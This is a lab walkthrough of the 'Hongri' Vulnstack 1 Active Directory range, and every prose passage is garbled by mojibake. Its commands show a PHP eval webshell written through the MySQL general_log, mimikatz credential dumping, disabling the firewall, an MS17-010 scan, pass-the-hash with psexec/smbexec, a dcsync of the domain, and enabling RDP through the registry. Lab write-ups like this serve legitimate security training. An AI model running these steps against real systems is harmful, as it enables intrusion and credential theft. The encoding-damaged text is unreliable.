# çº¢æ—¥é¶åœº 1

## ç¯å¢ƒæ­å»º


ç¯å¢ƒä¸­çš„ä¸‰å°æœºå™¨ ip å·²ç»æå‰åˆ†é…å¥½äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨ vm é‡Œåˆ›å»ºä¸€ä¸ª 192.168.52.0 çš„ host-only ç½‘ç»œï¼Œç„¶åå†ç»™ win7 å…¥å£æœºæ·»åŠ ä¸€å¼  NAT å‡ºç½‘ç½‘å¡ã€‚

| ä¸»æœº | ç½‘ç»œ |
| --- | --- |
| win7 | 192.168.52.143, 192.168.182.36 (å¤–) |
| win2003 | 192.168.52.141 |
| win2008 | 192.168.52.138 |

æŸ¥çœ‹ç»™çš„æ‹“æ‰‘å›¾ï¼š

![](https://cdn.silente.top/img/202309281401207.png)

ä¾æ¬¡å¯åŠ¨ä¸‰å°æœºå™¨ï¼Œç„¶ååœ¨ win7 è¿™é‡Œä½¿ç”¨ phpstudy å¯åŠ¨ web æœåŠ¡

![](https://cdn.silente.top/img/202309281403596.png)

ç„¶åéœ€è¦åœ¨ win7 å¤–ç½‘æœºä¸­æ·»åŠ  host: `192.168.52.138  god.org`

## æ”»å‡»è·¯å¾„

é¦–å…ˆä½¿ç”¨ kscan æ‰«ä¸€ä¸‹ web æœåŠ¡ (182.1 æ˜¯ç‰©ç†æœº)

![](https://cdn.silente.top/img/202309281407604.png)

æ˜¯ä¸€ä¸ª phpstudy 2014 çš„æ¢é’ˆæœåŠ¡ï¼Œç½‘ä¸Šæœæœ[åˆ©ç”¨æ–¹æ³•](https://www.freebuf.com/articles/web/252274.html)ï¼Œå¯ä»¥çœ‹åˆ° mysql å¼±å¯†ç  è¿™ä¸ªå…¥å£è·¯å¾„å·²ç»çƒ‚å¤§è¡—äº†

![](https://cdn.silente.top/img/202309281412986.png)

ç”¨ dirsearch èƒ½æ‰«å‡ºæ¥ phpmyadmin è¿™ä¸ªè·¯ç”±ï¼Œroot/root è¿›å…¥ï¼Œå°è¯•ç›´æ¥å†™å…¥

![](https://cdn.silente.top/img/202309281425006.png)

secure_file_priv = nullï¼Œæ— æ³•ç›´æ¥å†™å…¥æ–‡ä»¶ï¼›å¯ä»¥ä½¿ç”¨æ—¥å¿—æ¥è§£æ php

```sql
show variables like 'general_log'; -- æŸ¥çœ‹æ—¥å¿—æ˜¯å¦å¼€å¯
set global general_log=on; -- å¼€å¯æ—¥å¿—åŠŸèƒ½
show variables like 'general_log_file'; -- çœ‹çœ‹æ—¥å¿—æ–‡ä»¶ä¿å­˜ä½ç½®
set global general_log_file='C:/phpStudy/WWW/.se.php'; -- è®¾ç½®æ—¥å¿—æ–‡ä»¶ä¿å­˜ä½ç½®
show variables like 'log_output'; -- çœ‹çœ‹æ—¥å¿—è¾“å‡ºç±»å‹ tableæˆ–file
set global log_output='table'; -- è®¾ç½®è¾“å‡ºç±»å‹ä¸º table
set global log_output='file'; -- è®¾ç½®è¾“å‡ºç±»å‹ä¸ºfile
```

```sql
select "<?php echo 'Yes!';@eval(@$_POST['SilentE']); ?>" -- php é©¬
```
  
![](https://cdn.silente.top/img/202309281434343.png)


ä¸Šçº¿ viperï¼Œå°è¯•å†…ç½®çš„ææƒï¼ŒğŸ‚çš„ï¼Œä¸€ä¸‹å­å°±æœ‰ SYSTEM æƒé™äº†ï¼Œéƒ½ä¸çŸ¥é“æ€ä¹ˆæçš„hhã€‚
![](https://cdn.silente.top/img/202309281642267.png)




è½¬ç§»è¿›ç¨‹åˆ° 64 ä½

![](https://cdn.silente.top/img/202309300151589.png)

![](https://cdn.silente.top/img/202309300152734.png)

è¿™æ ·å°±èƒ½ä½¿ç”¨ 64 ä½çš„ `load kiwi` æ¥åŠ è½½ mimikatzï¼Œç„¶åä½¿ç”¨ `creds_all` æ¥æ‹¿å¯†ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ä¼ ä¸ªä¸Šå»æ“ä½œ

```shell
mimikatz_x64.exe "log" "privilege::debug" "sekurlsa::logonpasswords" exit 
```

![](https://cdn.silente.top/img/202309281656453.png)

å…³é—­é˜²ç«å¢™ï¼š`netsh advfirewall set allprofiles state off`

é…ç½®å†…ç½‘ä»£ç†ï¼Œä½¿ç”¨ Proxifier ä»£ç†è®¿é—®ã€‚

![](https://cdn.silente.top/img/202309281607208.png)

ç„¶åä¸Šä¼  kscanï¼Œæ‰«ä¸€ä¸‹å†…ç½‘ã€‚ 

```shell
kscan.exe -t 192.168.52.141,192.168.52.138 -o out.txt
```

![](https://cdn.silente.top/img/202309281519462.png)


å‘ç°å¼€äº† 445ï¼Œæ‰«ä¸€ä¸‹ ms17_010

```sh
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 192.168.52.141 192.168.52.138
run
```

![](https://cdn.silente.top/img/202309300003257.png)

ä½†æ˜¯æŠŠ msf çš„ payload éƒ½è¯•äº†ä¸ªéä¹Ÿæ‰“ä¸äº†ï¼Œä¼°è®¡æ˜¯è·Ÿé˜²ç«å¢™çš„é…ç½®æœ‰å…³ã€‚çœ‹åˆ°å‰é¢æ‹¿äº† hashï¼Œå¯ä»¥è¯•è¯• psexec å“ˆå¸Œä¼ é€’ã€‚è®°å¾—åœ¨æ­¤ä¹‹å‰éœ€è¦å…ˆå¼€ä¸€ä¸ªç›‘å¬ï¼Œç”¨è·³æ¿æœºçš„ session åšä¸€å±‚è½¬å‘ã€‚


![](https://cdn.silente.top/img/202309301624799.png)



![](https://cdn.silente.top/img/202309301630012.png)

å¯ä»¥çœ‹åˆ°èƒ½æ‹¿ä¸‹åŸŸæ§æœåŠ¡å™¨ (143)ï¼Œä½†æ˜¯ 141 è¿™ä¸ªå•æœºä¸çŸ¥é“æ€ä¹ˆå›äº‹ç”¨ psexec æ‹¿ä¸ä¸‹


```shell
load kiwi
kiwi_cmd lsadump::dcsync /domain:god.org /all /csv
```

ä½†æ˜¯ç”¨ smbexec è„šæœ¬åˆå¯ä»¥ç›´æ¥æ‹¿ä¸‹ã€‚ã€‚ã€‚

![](https://cdn.silente.top/img/202309301647721.png)

ç„¶åç›´æ¥è¿œç¨‹æ¡Œé¢è¿ä¸Šå»

```shell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
netstat -an|find "3389"
```

![](https://cdn.silente.top/img/202309301918569.png)


æ€»ä¹‹è¿™ä¸ªé¶åœºå°±å½“ç†Ÿæ‚‰ç†Ÿæ‚‰å·¥å…·å§hh


## æ¨ªå‘ç§»åŠ¨çŸ¥è¯†ç‚¹

- [æµ…æ¢å†…ç½‘æ¨ªå‘ç§»åŠ¨](https://xz.aliyun.com/t/8117)
- [æ·±å…¥äº†è§£Psexecä¸SMBexec](https://www.freebuf.com/articles/system/332115.html)